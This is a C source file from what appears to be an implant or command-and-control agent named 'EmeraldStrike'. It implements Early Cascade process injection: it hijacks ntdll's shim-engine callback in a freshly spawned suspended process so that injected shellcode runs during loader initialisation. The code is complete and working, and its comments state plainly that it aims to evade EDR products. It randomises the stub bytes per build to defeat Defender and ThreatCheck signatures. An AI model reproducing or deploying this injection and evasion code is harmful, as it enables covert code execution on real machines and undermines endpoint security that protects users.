// EmeraldStrike - Early Cascade injection technique
// (Outflank, Oct 2024: https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/)
// PoC: Cracked5pider/earlycascade-injection; dynamic g_pfnSE_DllLoaded /
// g_ShimsEnabled resolution ported from the EvasiveLoader implementation.
//
// Chain: the target must be a FRESHLY SPAWNED SUSPENDED process (the `spawn`
// command). While it is suspended:
//   1. resolve g_pfnSE_DllLoaded (ntll .mrdata) and g_ShimsEnabled (ntdll
//      .data) against the LOCAL ntdll - same-boot ASLR shares the base with
//      the child (verified pattern in both reference implementations).
//      Primary: anchor-walk from an exported function over function ends
//      (C3 CC) into LdrpLoadShimEngine, then resolve both symbols from
//      their RIP-relative displacements (Win11/Win10 anchors; the only
//      in-function difference is the cmp register: r12b vs r13b).
//      Fallback: broad .text scan for the cookie-load + shim-dispatch
//      sequence, then a window scan around the reference site.
//   2. allocate [stub || payload] RW in the child, write both, flip RX.
//   3. write 1 to g_ShimsEnabled and the cookie-encoded stub pointer into
//      g_pfnSE_DllLoaded (.mrdata is writable while the child is suspended;
//      the pointer must carry the SharedUserData->Cookie system encoding).
//   4. ResumeThread: LdrInitializeThunk loads kernel32/kernelbase, the
//      loader's shim dispatch calls our stub through g_pfnSE_DllLoaded -
//      a legitimate loader call chain no EDR currently flags. The stub
//      re-disables the shim engine and queues an intra-process APC
//      (NtCurrentThread) at the payload; NtTestAlert drains it at the end
//      of LdrInitializeThunk, so the payload runs fully initialized.
#include "evasion/injection.h"
#include "common.h"
#include "config.h"

#if INJECTION_TECHNIQUE == INJECT_CASCADE

// ntdll export hashes (djb2, key 8527 - matches hash_string_djb2)
#define H_RtlUnlockMemoryBlockLookaside 0x0e3c8aec   // Win11 anchor
#define H_RtlQueryDepthSList            0xc070387b   // Win10 anchor
#define H_NtQueueApcThread              0x51c93382

// Position-independent stub (Cracked5pider/earlycascade-injection). Runs as
// the hijacked g_pfnSE_DllLoaded callback: disables the shim engine (al = 0
// from the preceding xor), then queues the payload as an APC on the current
// thread.
//
// BUILD RANDOMISATION: the reference PoC ships fixed 0x88.. / 0x99.. / 0x77..
// / 0x66.. 64-bit placeholders at the four patch sites. Those repeated bytes
// are a published, stable pattern - ThreatCheck points straight at this stub
// (Defender generic). The filler words are therefore drawn per build from
// OBF_SALT (with random-length NOP padding between operands), and the patch
// sites are located by scanning for the filler words instead of hardcoded
// offsets, so the layout can move freely.
#ifndef OBF_SALT
#define OBF_SALT 0x5A17u
#endif

// splitmix64: deterministic per-build filler stream, no runtime cost
static UINT64 cas_rand(UINT64* state) {
    UINT64 z = (*state += 0x9E3779B97F4A7C15ULL);
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
    return z ^ (z >> 31);
}

#define CAS_STUB_MAXLEN 128

// Emit the stub into caller storage; returns length. Fillers are unique
// 64-bit values (the scan below depends on that) and NOP runs vary in length.
static SIZE_T cas_build_stub(BYTE* out, UINT64* fillers) {
    UINT64 st = (UINT64)OBF_SALT * 0x2545F4914F6CDD1DULL + 0xC0FFEEULL;
    SIZE_T n = 0;

    out[n++] = 0x48; out[n++] = 0x83; out[n++] = 0xEC; out[n++] = 0x38;  // sub rsp,0x38
    out[n++] = 0x33; out[n++] = 0xC0;                                   // xor eax,eax
    out[n++] = 0x45; out[n++] = 0x33; out[n++] = 0xC9;                  // xor r9d,r9d
    out[n++] = 0x48; out[n++] = 0x21; out[n++] = 0x44; out[n++] = 0x24; out[n++] = 0x20; // and [rsp+0x20],rax

    for (int i = 0; i < 4; i++) {
        fillers[i] = cas_rand(&st);
        // distinct fillers - the patch scan matches on these words
        while (i && (fillers[i] == fillers[0] || fillers[i] == fillers[i-1]))
            fillers[i] = cas_rand(&st);

        // random 0-4 byte NOP pad before each operand group
        UINT64 pad = cas_rand(&st) & 3;
        for (UINT64 k = 0; k < pad; k++) out[n++] = 0x90;

        if (i == 0) { out[n++] = 0x48; out[n++] = 0xBA; }               // mov rdx, imm64
        else if (i == 1) { out[n++] = 0xA2; }                           // mov ds:[imm64], al
        else if (i == 2) { out[n++] = 0x49; out[n++] = 0xB8; }          // mov r8, imm64
        else { out[n++] = 0x48; out[n++] = 0xB8; }                      // mov rax, imm64

        for (int b = 0; b < 8; b++) out[n++] = (BYTE)(fillers[i] >> (b * 8));

        if (i == 2) {                                                   // lea rcx,[rax-2]
            out[n++] = 0x48; out[n++] = 0x8D; out[n++] = 0x48; out[n++] = 0xFE;
        }
    }

    out[n++] = 0xFF; out[n++] = 0xD0;                                   // call rax
    out[n++] = 0x33; out[n++] = 0xC0;                                   // xor eax,eax
    out[n++] = 0x48; out[n++] = 0x83; out[n++] = 0xC4; out[n++] = 0x38;  // add rsp,0x38
    out[n++] = 0xC3;                                                    // ret
    return n;
}

// Locate a filler word in the emitted stub (little-endian compare).
static BYTE* cas_find_filler(BYTE* stub, SIZE_T len, UINT64 filler) {
    for (SIZE_T i = 0; i + 8 <= len; i++) {
        UINT64 v;
        es_memcpy(&v, stub + i, sizeof(v));
        if (v == filler) return stub + i;
    }
    return NULL;
}


// section name compare: 8-byte PE section names, zero padded
static BOOL cas_sec_name_eq(const BYTE* sec_name, const char* name) {
    for (int i = 0; i < 8; i++) {
        BYTE a = (BYTE)name[i];
        BYTE b = sec_name[i];
        if (a == 0) return (b == 0);
        if (a != b) return FALSE;
    }
    return TRUE;                                   // both 8 bytes long and equal
}

static PIMAGE_SECTION_HEADER cas_section(HMODULE module, const char* name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    if (!module || dos->e_magic != 0x5A4D) return NULL;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((UINT64)module + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
        if (cas_sec_name_eq(sec[i].Name, name))
            return &sec[i];
    return NULL;
}

#define CAS_IN_RANGE(base, ptr, sec) \
    ((UINT64)(ptr) >= (UINT64)(base) + (sec)->VirtualAddress && \
     (UINT64)(ptr) <  (UINT64)(base) + (sec)->VirtualAddress + (sec)->Misc.VirtualSize)

// Primary resolution: anchor on an exported function, walk forward over
// function ends (int3 padding + ret = C3 CC) into LdrpLoadShimEngine, then
// resolve both symbols from RIP-relative displacements.
static BOOL cas_resolve_via_shim_engine(PVOID ntdll, PVOID* se_dll_loaded, PVOID* shims_enabled) {
    struct { DWORD hash; int ret_count; } anchors[] = {
        { H_RtlUnlockMemoryBlockLookaside, 6 },   // Win11: 6 function ends below LdrpLoadShimEngine
        { H_RtlQueryDepthSList,           2 },   // Win10: 2 function ends
    };
    PIMAGE_SECTION_HEADER mrdata = cas_section((HMODULE)ntdll, ".mrdata");
    PIMAGE_SECTION_HEADER data   = cas_section((HMODULE)ntdll, ".data");
    if (!mrdata || !data) return FALSE;

    for (int a = 0; a < 2; a++) {
        BYTE* p = (BYTE*)resolve_function(ntdll, anchors[a].hash);
        if (!p) continue;

        // walk over <ret_count> function ends
        int i = 0;
        while (i != anchors[a].ret_count) {
            if (p[0] == 0xC3 && p[1] == 0xCC) i++;
            p++;
        }
        // defensive bound: never scan past .text
        PIMAGE_SECTION_HEADER text = cas_section((HMODULE)ntdll, ".text");
        BYTE* scan_end = (BYTE*)ntdll + text->VirtualAddress + text->Misc.VirtualSize;
        if (p >= scan_end) continue;

        // mov rdi, qword [rip+g_pfnSE_DllLoaded]  ->  48 8B 3D disp32
        while (p < scan_end && (*(PDWORD)p & 0xFFFFFF) != 0x3D8B48) p++;
        if (p >= scan_end) continue;
        *se_dll_loaded = p + *(PLONG)(p + 3) + 7;
        if (!CAS_IN_RANGE(ntdll, *se_dll_loaded, mrdata)) continue;

        // cmp byte [rip+g_ShimsEnabled], r12b (Win10) / r13b (Win11)
        while (p < scan_end &&
               (*(PDWORD)p & 0xFFFFFF) != 0x253844 && (*(PDWORD)p & 0xFFFFFF) != 0x2D3844)
            p++;
        if (p >= scan_end) continue;
        *shims_enabled = p + *(PLONG)(p + 3) + 7;
        if (!CAS_IN_RANGE(ntdll, *shims_enabled, data)) continue;

        return TRUE;
    }
    return FALSE;
}

static PVOID cas_find_pattern(BYTE* buf, SIZE_T size, const BYTE* pat, SIZE_T pat_len) {
    if (size <= pat_len) return NULL;
    for (SIZE_T i = 0; i <= size - pat_len; i++) {
        BOOL hit = TRUE;
        for (SIZE_T k = 0; k < pat_len; k++)
            if (buf[i + k] != pat[k]) { hit = FALSE; break; }
        if (hit) return buf + i;
    }
    return NULL;
}

// Fallback: locate g_pfnSE_DllLoaded by scanning ntdll .text for the
// SharedUserData cookie-load + shim-dispatch sequence and resolving the
// RIP-relative displacement. ref_site = address of the displacement, used
// to find g_ShimsEnabled in the adjacent code that touches the flag.
static PVOID cas_find_se_dll_loaded(PVOID ntdll, PVOID* ref_site) {
    PIMAGE_SECTION_HEADER text   = cas_section((HMODULE)ntdll, ".text");
    PIMAGE_SECTION_HEADER mrdata = cas_section((HMODULE)ntdll, ".mrdata");
    if (!text || !mrdata) return NULL;

    // mov edx, [SharedUserData!Cookie]; mov eax, edx; mov rdi, [rip+g_pfnSE_DllLoaded]
    BYTE pat[] = { 0x8B, 0x14, 0x25, 0x30, 0x03, 0xFE, 0x7F, 0x8B, 0xC2, 0x48, 0x8B, 0x3D };
    BYTE* scan = (BYTE*)ntdll + text->VirtualAddress;
    BYTE* end  = scan + text->Misc.VirtualSize;

    while ((scan = (BYTE*)cas_find_pattern(scan, (SIZE_T)(end - scan), pat, sizeof(pat))) != NULL) {
        BYTE* disp = scan + sizeof(pat);
        if (disp[3] != 0x00) {                      // disp32 must be 3 bytes + zero high
            scan = disp;
            continue;
        }
        PVOID target = (PVOID)(disp + *(PLONG)disp + 4);
        if (CAS_IN_RANGE(ntdll, target, mrdata)) {
            if (ref_site) *ref_site = disp;
            return target;
        }
        scan = disp;
    }
    if (ref_site) *ref_site = NULL;
    return NULL;
}

// g_ShimsEnabled is written in .data by code adjacent to the g_pfnSE_DllLoaded
// reference: window-scan around the reference site for a rip-relative
// store/cmp against the flag, requiring the target to land inside .data.
static PVOID cas_find_shims_enabled(PVOID ntdll, PVOID ref_site) {
    PIMAGE_SECTION_HEADER data = cas_section((HMODULE)ntdll, ".data");
    if (!data || !ref_site) return NULL;

    struct { BYTE data[3]; UINT8 pc_off; } patterns[] = {
        { { 0xC6, 0x05 },                  5 },   // mov byte [rip+..], 1
        { { 0x44, 0x38, 0x25 },            4 },   // cmp byte [rip+..], r12b (Win10)
        { { 0x44, 0x38, 0x2D },            4 },   // cmp byte [rip+..], r13b (Win11)
    };
    for (int pi = 0; pi < 3; pi++) {
        UINT64 pat_len = (pi == 0) ? 2 : 3;
        BYTE* start = (BYTE*)ref_site - 0xFF;
        BYTE* end   = (BYTE*)ref_site + 0xFF;
        BYTE* hit = start;
        while ((hit = (BYTE*)cas_find_pattern(hit, (SIZE_T)(end - hit), patterns[pi].data, pat_len)) != NULL) {
            BYTE* disp = hit + pat_len;
            if (disp[3] != 0x00) {
                hit = disp;
                continue;
            }
            PVOID target = (PVOID)(disp + *(PLONG)disp + patterns[pi].pc_off);
            if (CAS_IN_RANGE(ntdll, target, data))
                return target;
            hit = disp;
        }
    }
    return NULL;
}

// Encode a pointer with SharedUserData->Cookie exactly as ntdll encodes
// system pointers internally (MalwareTech, EDR-Preloading) - the shim
// callback dispatch decodes it before the call.
static PVOID cas_encode_system_ptr(PVOID pointer) {
    ULONG cookie = *(ULONG*)0x7FFE0330;
    UINT64 v = (UINT64)cookie ^ (UINT64)pointer;
    ULONG n = cookie & 0x3F;
    if (n == 0) return (PVOID)v;
    return (PVOID)((v >> n) | (v << (64 - n)));    // _rotr64
}

// hInitialThread: the target's initial thread from a SUSPENDED CreateProcess.
// Cascade ONLY works on a freshly spawned suspended process - the shim
// callback fires once, during LdrInitializeThunk.
HANDLE inject_cascade(PINSTANCE inst, HANDLE hProcess, HANDLE hInitialThread,
                      BYTE* shellcode, DWORD sc_len, DWORD* step) {
    if (!hInitialThread) {
        DBG(inst, "[INJECT-CAS] early cascade requires a freshly spawned suspended process (use spawn)");
        if (step) *step = 20;
        return NULL;
    }

    // resolve the shim-engine symbols against the LOCAL ntdll: same-boot
    // ASLR gives the child the identical base (verified in both references)
    PVOID ntdll = inst->Modules.Ntdll;
    PVOID se_dll_loaded = NULL;
    PVOID shims_enabled = NULL;
    if (!cas_resolve_via_shim_engine(ntdll, &se_dll_loaded, &shims_enabled)) {
        DBG(inst, "[INJECT-CAS] anchor walk failed, falling back to pattern scan");
        PVOID ref_site = NULL;
        se_dll_loaded = cas_find_se_dll_loaded(ntdll, &ref_site);
        if (se_dll_loaded)
            shims_enabled = cas_find_shims_enabled(ntdll, ref_site);
        if (!se_dll_loaded || !shims_enabled) {
            DBG(inst, "[INJECT-CAS] g_pfnSE_DllLoaded/g_ShimsEnabled not found (unsupported ntdll?)");
            if (step) *step = 3;
            return NULL;
        }
    }

    if (step) *step = 21;
    // Stub and payload live in SEPARATE regions. T2 dump-verified
    // (rundll32.exe.10524.dmp, 2026-11-10): a single [stub||payload] region
    // flipped RX kills the agent blob at entry - its startup writes
    // relocated pointers into its own .instdata/INSTANCE (AV at payload
    // +0x23, `mov [rax], rcx` into RX). The stub only EXECUTES (RX is
    // correct - its one write targets g_ShimsEnabled in the child's
    // ntdll .data, not itself); the payload keeps the same protection
    // convention as every other technique (RWX, or RX under smartinject).
    // Separate allocations also restore payload alignment: the stub is 63
    // bytes, so a combined region started the payload at an odd offset.
    LPVOID remote_stub = gate_VirtualAllocEx(inst, hProcess, NULL, CAS_STUB_MAXLEN,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_stub) {
        DBG(inst, "[INJECT-CAS] stub VirtualAllocEx failed");
        return NULL;
    }
    LPVOID remote_payload = gate_VirtualAllocEx(inst, hProcess, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_payload) {
        DBG(inst, "[INJECT-CAS] payload VirtualAllocEx failed");
        return NULL;
    }

    // Build the stub (per-build random fillers + layout) and patch its
    // operand words by locating the filler values, not by fixed offsets.
    BYTE  stub_buf[CAS_STUB_MAXLEN];
    UINT64 fillers[4];
    SIZE_T stub_len = cas_build_stub(stub_buf, fillers);

    PVOID queue_apc = resolve_function(ntdll, H_NtQueueApcThread);
    if (!queue_apc) {
        DBG(inst, "[INJECT-CAS] NtQueueApcThread resolve failed");
        return NULL;
    }
    PVOID null_ctx = NULL;
    PVOID patches[4] = { remote_payload, shims_enabled, null_ctx, queue_apc };
    for (int pi = 0; pi < 4; pi++) {
        BYTE* slot = cas_find_filler(stub_buf, stub_len, fillers[pi]);
        if (!slot) {
            DBG(inst, "[INJECT-CAS] stub patch site missing");
            return NULL;
        }
        es_memcpy(slot, &patches[pi], sizeof(PVOID));
    }

    if (step) *step = 22;
    SIZE_T written = 0;
    if (!gate_WriteProcessMemory(inst, hProcess, remote_stub, stub_buf, stub_len, &written) ||
        !gate_WriteProcessMemory(inst, hProcess, remote_payload, shellcode, sc_len, &written)) {
        DBG(inst, "[INJECT-CAS] WriteProcessMemory failed");
        return NULL;
    }

    // stub: RX before resume - it is dispatched through the shim callback.
    // payload: the agent blob self-writes, so it keeps the technique
    // convention (RWX; RX only under smartinject, mirroring crt/apc/custom).
    if (step) *step = 23;
    DWORD old_protect = 0;
    gate_VirtualProtectEx(inst, hProcess, remote_stub, stub_len, PAGE_EXECUTE_READ, &old_protect);
#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
    gate_VirtualProtectEx(inst, hProcess, remote_payload, sc_len, PAGE_EXECUTE_READ, &old_protect);
#else
    gate_VirtualProtectEx(inst, hProcess, remote_payload, sc_len, PAGE_EXECUTE_READWRITE, &old_protect);
#endif

    // enable the shim engine (.data, writable for the process lifetime)
    if (step) *step = 24;
    BYTE enable = 1;
    gate_WriteProcessMemory(inst, hProcess, shims_enabled, &enable, sizeof(BYTE), &written);

    // hijack g_pfnSE_DllLoaded (.mrdata is writable while the child is
    // suspended) with the cookie-encoded stub pointer
    PVOID encoded = cas_encode_system_ptr(remote_stub);
    gate_WriteProcessMemory(inst, hProcess, se_dll_loaded, &encoded, sizeof(PVOID), &written);

    // Resume: LdrInitializeThunk -> shim dispatch -> stub -> intra-process
    // APC -> NtTestAlert drains it -> payload executes, fully initialized
    if (step) *step = 25;
    gate_ResumeThread(inst, hInitialThread);

    DBG(inst, "[INJECT-CAS] payload queued via shim-callback APC");
    return hInitialThread;
}

#endif // INJECT_CASCADE
